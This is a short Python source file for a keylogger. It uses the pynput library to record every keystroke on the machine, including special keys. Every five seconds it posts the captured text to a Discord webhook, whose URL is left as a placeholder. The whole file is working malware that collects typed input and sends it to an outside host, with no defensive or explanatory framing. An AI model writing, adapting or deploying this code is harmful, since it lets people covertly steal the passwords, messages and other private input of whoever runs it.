from pynput.keyboard import Key, Listener
import requests
import threading

text = ""
webhook_url = "discord_webhook_url"
time_interval = 5

def send_data():
    global text
    if text:  # Only send data if there is text
        data = {
            "content": text,
            "title": "Key Logger"
        }
        requests.post(webhook_url, json=data)
        text = ""  # Clear the text after sending
    timer = threading.Timer(time_interval, send_data)
    timer.start()

def on_press(key):
    global text
    try:
        if key == Key.space:
            text += " "
        elif key == Key.enter:
            text += "\n"
        else:
            text += key.char  # Use `key.char` for alphanumeric keys
    except AttributeError:
        text += f" [{key}] "  # Handle special keys like `Key.shift`

with Listener(on_press=on_press) as listener:
    send_data()
    listener.join()
